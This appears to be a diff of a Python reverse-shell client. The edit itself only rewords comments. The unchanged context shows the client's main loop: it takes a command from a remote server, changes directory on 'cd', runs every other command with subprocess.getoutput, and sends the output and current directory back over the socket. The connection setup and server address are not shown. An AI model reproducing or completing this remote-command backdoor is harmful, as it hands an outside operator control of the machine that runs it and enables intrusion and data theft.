@@ -34,23 +34,23 @@ while True:
             split = cmd.split()
             
             if cmd.lower() == "exit":
-            # if the command is exit, just break out of the loop
+            # if the cmd is exit, break loop. seems to have a bug?
                 break
             if split[0].lower() == "cd":
             # cd command, change directory
                 try:
                     os.chdir(' '.join(split[1:]))
                 except FileNotFoundError as e:
-            # if there is an error, set as the output
+            # if error, set as output
                     output = str(e)
                 else:
-            # if operation is successful, empty message
+            # if successful, output empty message
                     output = ""
             else:
-            # execute the command and retrieve the results
+            # execute cmd and get results
                 output = subprocess.getoutput(cmd)
             wd = os.getcwd()
-            # send the results back to the server
+            # send results to server
             message = f"{output}{sep}{wd}"
             s.send(message.encode())                                       
 
